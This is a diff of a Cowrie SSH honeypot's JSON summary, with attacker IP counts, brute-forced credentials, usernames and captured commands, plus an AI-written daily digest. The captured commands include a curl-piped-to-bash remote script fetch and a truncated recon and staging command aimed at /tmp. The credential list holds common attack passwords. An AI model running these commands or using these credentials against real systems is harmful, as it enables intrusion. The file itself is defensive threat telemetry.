@@ -1,25 +1,25 @@
 {
  "generated_from": "honeypot-01 (Cowrie sensor, 92.5.188.26)",
  "totals": {
-  "events": 1858,
-  "distinct_ips": 12
+  "events": 2550,
+  "distinct_ips": 14
  },
  "by_kind": [
   {
    "kind": "cowrie_command",
-   "n": 507
+   "n": 679
   },
   {
    "kind": "cowrie_connect",
-   "n": 457
+   "n": 630
   },
   {
    "kind": "cowrie_session",
-   "n": 456
+   "n": 630
   },
   {
    "kind": "cowrie_login_success",
-   "n": 435
+   "n": 608
   },
   {
    "kind": "cowrie_login_failed",
@@ -29,11 +29,11 @@
  "top_ips": [
   {
    "ip": "109.160.32.176",
-   "n": 1656
+   "n": 2340
   },
   {
    "ip": "193.32.162.84",
-   "n": 126
+   "n": 127
   },
   {
    "ip": "161.33.14.212",
@@ -49,6 +49,10 @@
   },
   {
    "ip": "127.0.0.1",
+   "n": 4
+  },
+  {
+   "ip": "130.12.180.51",
    "n": 4
   },
   {
@@ -70,16 +74,16 @@
   {
    "ip": "64.23.140.96",
    "n": 4
-  },
-  {
-   "ip": "78.104.125.223",
-   "n": 4
   }
  ],
  "top_credentials": [
   {
    "cred": "root/LeitboGi0ro",
    "n": 7
+  },
+  {
+   "cred": "root/123@@@",
+   "n": 3
   },
   {
    "cred": "root/admin123",
@@ -90,7 +94,11 @@
    "n": 2
   },
   {
-   "cred": "root/123@@@",
+   "cred": "root/P@ssw0rd",
+   "n": 2
+  },
+  {
+   "cred": "root/123456789",
    "n": 2
   },
   {
@@ -110,6 +118,10 @@
    "n": 2
   },
   {
+   "cred": "admin/admin",
+   "n": 2
+  },
+  {
    "cred": "zq/zqzq",
    "n": 1
   },
@@ -118,80 +130,68 @@
    "n": 1
   },
   {
+   "cred": "zhuangyue/q1w2e3R$",
+   "n": 1
+  },
+  {
    "cred": "zahra/12345678",
-   "n": 1
-  },
-  {
-   "cred": "zabbix/zabbix",
-   "n": 1
-  },
-  {
-   "cred": "ymy/1",
-   "n": 1
-  },
-  {
-   "cred": "www/www",
-   "n": 1
-  },
-  {
-   "cred": "wso2/wso2",
    "n": 1
   }
  ],
  "top_usernames": [
   {
    "username": "root",
-   "n": 184
+   "n": 247
   },
   {
    "username": "admin",
-   "n": 14
+   "n": 19
   },
   {
    "username": "ubuntu",
-   "n": 12
+   "n": 17
   },
   {
    "username": "deploy",
-   "n": 9
+   "n": 13
   },
   {
    "username": "user",
-   "n": 8
+   "n": 10
+  },
+  {
+   "username": "user1",
+   "n": 9
   },
   {
    "username": "test",
    "n": 6
   },
   {
-   "username": "user1",
+   "username": "dev",
+   "n": 5
+  },
+  {
+   "username": "claude",
+   "n": 5
+  },
+  {
+   "username": "trader",
+   "n": 4
+  },
+  {
+   "username": "minecraft",
    "n": 4
   },
   {
    "username": "developer",
    "n": 4
-  },
-  {
-   "username": "myuser",
-   "n": 3
-  },
-  {
-   "username": "guest",
-   "n": 3
-  },
-  {
-   "username": "fastuser",
-   "n": 3
-  },
-  {
-   "username": "dev",
-   "n": 3
   }
  ],
  "top_commands": [
   {
    "cmd": "uname -s -v -n -r -m",
-   "n": 412
+   "n": 583
   },
   {
    "cmd": "printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter ",
@@ -224,6 +224,10 @@
   {
    "cmd": "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/re",
    "n": 4
+  },
+  {
+   "cmd": "uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; cd /tmp || cd /var/tmp || ",
+   "n": 1
   }
  ],
  "by_hour": [
@@ -237,7 +241,12 @@
   },
   {
    "hour": "2026-09-27T21",
-   "n": 210
+   "n": 902
   }
- ]
+ ],
+ "latest_digest": {
+  "day": "2026-09-27",
+  "text": "LogKompass honeypot-01, 2026-09-27\n\n2550 events from 14 IPs; no 7-day baseline available\n109.160.32.176 (2340 events); country and network unknown\nTargeted root, admin, ubuntu, deploy, user via password brute force\nNo high-severity findings; all alerts rated low\nBlock 109.160.32.176 and enforce key-only authentication\n\nmodel: nvidia/nemotron-3-ultra-550b-a55b:free via openrouter-free, 12.1 s",
+  "created_at": "2026-09-27T21:21:15Z"
+ }
 }
